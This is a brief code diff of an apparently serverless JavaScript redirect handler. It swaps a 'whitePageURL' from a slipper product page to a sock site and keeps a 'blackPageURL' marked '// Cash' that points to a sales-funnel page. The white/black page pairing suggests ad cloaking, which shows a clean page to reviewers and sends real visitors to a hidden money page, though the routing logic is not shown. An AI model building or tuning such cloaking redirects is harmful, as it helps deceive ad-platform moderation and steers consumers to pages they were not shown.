@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://dreamersnschemers.com/collections/slippers/products/horse-head-emoji-slippers";
+    const whitePageURL = "https://jefferiessocksus.vercel.app/?utm_campaign=__AID_NAME__";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/target2342";
   
